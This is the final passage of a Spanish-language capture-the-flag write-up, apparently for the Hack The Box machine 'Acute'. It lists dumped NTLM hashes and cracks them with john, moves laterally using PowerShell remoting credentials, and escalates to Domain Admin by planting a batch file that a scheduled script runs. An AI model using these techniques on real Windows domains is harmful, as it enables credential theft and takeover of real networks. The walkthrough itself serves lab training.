      des_cbc_md5       (4096) : 1089e6eca449c731

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : MVL-SVR01.MARVEL.HTBNatasha
    Credentials
      des_cbc_md5       : 978a07d05ba770f7
    OldCredentials
      des_cbc_md5       : 1089e6eca449c731
</code></pre></div><p>De la salida anterior, conseguimos los siguientes <em>hashes</em> NTLM:</p><ul><li><code>Administrator:a29f7623fd11550def0192de9246f46b</code></li><li><code>Natasha:29ab86c5c4d2aab957763e5c1720486d</code></li><li><code>WDAGUtilityAccount:24571eab88ac0e2dcef127b8e9ad4740</code></li></ul><p>En lugar de utilizar <em>Pass the Hash</em>, los trataremos de romper con <code>john</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> <span class="code-dark-yellow">'Administrator:a29f7623fd11550def0192de9246f46b'</span> &gt;&gt; hashes

<span class="code-cyan">$</span> <span class="code-dark-green">echo</span> <span class="code-dark-yellow">'Natasha:29ab86c5c4d2aab957763e5c1720486d'</span> &gt;&gt; <span class="mtku">hashes</span>

<span class="code-cyan">$</span> <span class="code-dark-green">echo</span> <span class="code-dark-yellow">'WDAGUtilityAccount:24571eab88ac0e2dcef127b8e9ad4740'</span> &gt;&gt; <span class="mtku">hashes</span>

<span class="code-cyan">$</span> <span class="code-dark-green">john</span> --wordlist=$WORDLISTS/rockyou.txt --format=NT <span class="mtku">hashes</span>
Using default input encoding: UTF-8
Loaded 3 password hashes with no different salts (NT [MD4 128/128 ASIMD 4x2])
Press 'q' or Ctrl-C to abort, almost any other key for status
<span class="code-dark-red">Password@123</span>     (<span class="code-dark-red">Administrator</span>)
1g 0:00:00:00 DONE 1.098g/s 15762Kp/s 15762Kc/s 32676KC/s "amo-te"..*7¡Vamos!
Use the "--show --format=NT" options to display all of the cracked passwords reliably  
Session completed.
</code></pre></div><h2 id="movimiento-lateral-al-usuario-awallace">Movimiento lateral al usuario <code>awallace</code></h2><p>Ahora podemos acceder como <code>awallace</code> utilizando el mismo procedimiento que antes:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Utils&gt; <span class="code-green">$pass</span> <span class="code-grey">=</span> <span class="code-yellow">ConvertTo-SecureString</span> <span class="code-dark-cyan">"Password@123"</span> <span class="code-grey">-AsPlaintext -Force</span>
PS C:\Utils&gt; <span class="code-green">$cred</span> <span class="code-grey">=</span> <span class="code-yellow">New-Object</span> System.Management.Automation.PSCredential (<span class="code-dark-cyan">"acute\awallace"</span>, <span class="code-green">$pass</span>)
PS C:\Utils&gt; <span class="code-yellow">Invoke-Command</span> atsserver <span class="code-grey">-ConfigurationName</span> dc_manage <span class="code-grey">-Credential</span> <span class="code-green">$cred</span> <span class="code-grey">-ScriptBlock</span> { <span class="code-yellow">whoami</span> }  
acute\imonks
PS C:\Utils&gt; <span class="code-yellow">Invoke-Command</span> atsserver <span class="code-grey">-ConfigurationName</span> dc_manage <span class="code-grey">-Credential</span> <span class="code-green">$cred</span> <span class="code-grey">-ScriptBlock</span> { <span class="code-yellow">whoami</span> }
acute\awallace
</code></pre></div><p>Este usuario es capaz de listar la carpeta <code>C:\Program Files\keepmeon</code>, donde encontramos un <em>script</em> Batch:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Utils&gt; <span class="code-yellow">Invoke-Command</span> atsserver <span class="code-grey">-ConfigurationName</span> dc_manage <span class="code-grey">-Credential</span> <span class="code-green">$cred</span> <span class="code-grey">-ScriptBlock</span> { <span class="code-yellow">ls</span> "C:\Program Files\keepmeon" }


    Directory: C:\Program Files\keepmeon


Mode                 LastWriteTime         Length Name                                                  PSComputerName
----                 -------------         ------ ----                                                  --------------
-a----        21/12/2021     14:57            128 keepmeon.bat                                          atsserver


PS C:\Utils&gt; <span class="code-yellow">Invoke-Command</span> atsserver <span class="code-grey">-ConfigurationName</span> dc_manage <span class="code-grey">-Credential</span> <span class="code-green">$cred</span> <span class="code-grey">-ScriptBlock</span> { <span class="code-yellow">type</span> "C:\Program Files\keepmeon\keepmeon.bat" }  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">REM</span> <span class="mtk3">This</span> <span class="mtk3">is</span> <span class="mtk3">run</span> <span class="mtk3">every</span> <span class="mtk3">5</span> <span class="mtk3">minutes.</span> <span class="mtk3">For</span> <span class="mtk3">Lois</span> <span class="mtk3">use</span> <span class="mtk3">ONLY</span>  
<span class="mtk5">@echo</span> <span class="mtk5">off</span>
 <span class="mtk5">for</span> <span class="mtk1">/R</span> <span class="mtk9 mtki">%%x</span> <span class="mtk5">in</span> <span class="mtk1">(*.bat)</span> <span class="mtk5">do</span> <span class="mtk1">(</span>
 <span class="mtk5">if</span> <span class="mtk5">not</span> <span class="mtk4">"</span><span class="mtk9 mtki">%%x</span><span class="mtk4">"</span> <span class="mtk5">==</span> <span class="mtk4">"</span><span class="mtk9 mtki">%~0</span><span class="mtk4">"</span> <span class="mtk5">call</span> <span class="mtk4">"</span><span class="mtk9 mtki">%%x</span><span class="mtk4">"</span>
<span class="mtk1">)</span>
</code></pre></div><p>El <em>script</em> se ejecuta cada 5 minutos y básicamente ejecuta cualquier <em>script</em> Batch que hay en la carpeta actual.</p><h2 id="escalada-de-privilegios-a-administrador-del-dominio">Escalada de privilegios a administrador del dominio</h2><p>Aquí tenemos que recordar que <code>Lois</code> (<code>lhopkins</code>) es capaz de asignar los miembros de los grupos (mostrado en el documento de Word). Por tanto, podemos utilizar un comando para añadir a <code>awallace</code> al grupo <code>Site_Admin</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Utils&gt; <span class="code-yellow">Invoke-Command</span> <span class="code-grey">-ConfigurationName</span> dc_manage <span class="code-grey">-Credential</span> <span class="code-green">$cred</span> <span class="code-grey">-ScriptBlock</span> { <span class="code-yellow">Set-Content</span> <span class="code-grey">-Path</span> <span class="code-yellow">net</span> user lhopkins }
User name                    lhopkins
Full Name                    Lois Hopkins
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            21/12/2021 14:51:53
Password expires             Never
Password changeable          22/12/2021 14:51:53
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   27/02/2022 01:31:45

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users
The command completed successfully.

PS C:\Utils&gt; <span class="code-yellow">Invoke-Command</span> atsserver <span class="code-grey">-ConfigurationName</span> dc_manage <span class="code-grey">-Credential</span> <span class="code-green">$cred</span> <span class="code-grey">-ScriptBlock</span> { <span class="code-yellow">Set-Content</span> <span class="code-grey">-Path</span> <span class="code-dark-cyan">"C:\Program Files\keepmeon\a.bat"</span> <span class="code-grey">-Value</span> <span class="code-yellow">net</span> group site_admin }
Group name     Site_Admin
Comment        Only in the event of emergencies is this to be populated. This has access to Domain Admin group

Members

-------------------------------------------------------------------------------
The command completed successfully.

PS C:\Utils&gt; <span class="code-yellow">Invoke-Command</span> atsserver <span class="code-grey">-ConfigurationName</span> dc_manage <span class="code-grey">-Credential</span> <span class="code-green">$cred</span> <span class="code-grey">-ScriptBlock</span> { <span class="code-yellow">Set-Content</span> <span class="code-grey">-Path</span> <span class="code-dark-cyan">"C:\Program Files\keepmeon\a.bat"</span> <span class="code-grey">-Value</span> <span class="code-dark-cyan">"net group site_admin awallace /add /domain"</span> }  

PS C:\Utils&gt; <span class="code-yellow">Invoke-Command</span> atsserver <span class="code-grey">-ConfigurationName</span> dc_manage <span class="code-grey">-Credential</span> <span class="code-green">$cred</span> <span class="code-grey">-ScriptBlock</span> { <span class="code-yellow">type</span> <span class="code-dark-cyan">"C:\Program Files\keepmeon\a.bat"</span> }
net group site_admin awallace /add /domain
</code></pre></div><p>Después de algunos minutos, veremos que pertenecemos al grupo <code>Domain Admins</code>, y por tanto, podremos leer la <em>flag</em> <code>root.txt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Utils&gt; <span class="code-yellow">Invoke-Command</span> atsserver <span class="code-grey">-ConfigurationName</span> dc_manage <span class="code-grey">-Credential</span> <span class="code-green">$cred</span> <span class="code-grey">-ScriptBlock</span> { <span class="code-yellow">whoami</span> /groups }

GROUP INFORMATION
-----------------

Group Name                                   Type             SID                                            Attributes

============================================ ================ ============================================== ===============================================================  
Everyone                                     Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access   Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access      Alias            S-1-5-32-574                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                       Alias            S-1-5-32-544                                   Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                         Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users             Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization               Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
ACUTE\Domain Admins                          Group            S-1-5-21-1786406921-1914792807-2072761762-512  Mandatory group, Enabled by default, Enabled group
ACUTE\Managers                               Group            S-1-5-21-1786406921-1914792807-2072761762-1111 Mandatory group, Enabled by default, Enabled group
ACUTE\Site_Admin                             Group            S-1-5-21-1786406921-1914792807-2072761762-2102 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity   Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
ACUTE\Denied RODC Password Replication Group Alias            S-1-5-21-1786406921-1914792807-2072761762-572  Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\High Mandatory Level         Label            S-1-16-12288

PS C:\Utils&gt; <span class="code-yellow">Invoke-Command</span> atsserver <span class="code-grey">-ConfigurationName</span> dc_manage <span class="code-grey">-Credential</span> <span class="code-green">$cred</span> <span class="code-grey">-ScriptBlock</span> { <span class="code-yellow">type</span> C:\Users\Administrator\Desktop\root.txt }
4964aad06240586b6e55bf408011c24e
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin-bottom:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración-web">Enumeración web</a></li><li><a href="#enumeración-de-usuarios">Enumeración de usuarios</a></li><li><a href="#analizando-acute-pc01">Analizando <code>Acute-PC01</code></a></li><li><a href="#capturas-de-pantalla-de-una-sesión-de-escritorio-remoto">Capturas de pantalla de una sesión de escritorio remoto</a></li><li><a href="#ejecutando-comandos-en-el-controlador-de-dominio">Ejecutando comandos en el controlador de dominio</a></li><li><a href="#extracción-de-_hashes_-ntlm">Extracción de <em>hashes</em> NTLM</a></li><li><a href="#movimiento-lateral-al-usuario-awallace">Movimiento lateral al usuario <code>awallace</code></a></li><li><a href="#escalada-de-privilegios-a-administrador-del-dominio">Escalada de privilegios a administrador del dominio</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bg-black bottom-0 w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky 2022</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></footer></body></html>